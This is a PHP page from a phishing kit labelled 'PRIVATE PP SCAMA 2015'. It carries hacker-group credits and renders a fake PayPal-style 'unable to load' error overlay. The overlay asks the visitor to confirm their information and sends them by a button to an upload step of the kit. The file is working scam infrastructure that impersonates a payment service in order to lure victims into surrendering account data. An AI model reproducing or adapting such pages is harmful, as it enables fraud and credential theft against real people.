<?php session_start(); ?>
<?php

/*

+----------------------------------+
�--- PRIVATE  PP SCAMA   2015 -----�
�---------- Ver : 2.0 -------------�
�--------- HaMza-x Ben  -----------�
�----------- GREETZ TO ------------�
�--- Dz Phoniex : Dz Injector -----�
�----------------------------------�
�https://code.google.com/p/dznoob/ �
�----------------------------------�
�https://facebook.com/DzNOoBpage   �
+----------------------------------+


*/

@ini_set('display_errors', 0);
error_reporting(E_ALL ^ E_NOTICE);
date_default_timezone_set('GMT');
$copyright = date("Y");
include "../lang".$_SESSION['DZLN'];
?>







<!DOCTYPE html>
<html lang="en_GB" class="js" dir="ltr">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title> <?php echo $unabletoload; ?> </title>
<link rel="shortcut icon" sizes="196x196" href="pp196.png"><link rel="shortcut icon" type="image/x-icon" href="dznoobfav.ico">
<link rel="icon" type="image/x-icon" href="pp32.png">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
<link rel="stylesheet" type="text/css" href="error.css" media="all">
</head>


<body>

 


<section id="js_ajaxErrorOverpanel" class="theoverpanel animated med fadeInUpBig" tabindex="-1" role="dialog" aria-labelledby="overpanel-header" aria-hidden="false"><div class=" overpanel-wrapper"><div class="overpanel-content" role="document"><div id="overpanel-header" class="overpanel-header">


<div class="fullScreenDialog"><span class="icon icon-large icon-critical-large" aria-hidden="true"></span><h2 class="x-large"> <?php echo $unabletoload; ?> </h2></div></div><div class="overpanel-body row-fluid"><div class="fullScreenDialog"><p class="fullBodyText"> <?php echo $confirmyourinfo; ?> </p><p>

 <a href="../upl/index.php?y= <?php echo md5(rand(100, 999999999)); ?> ""><button class="btn tryAgain"> <?php echo $confirmbutton; ?> </button></a>
</p></div></div>

</html>
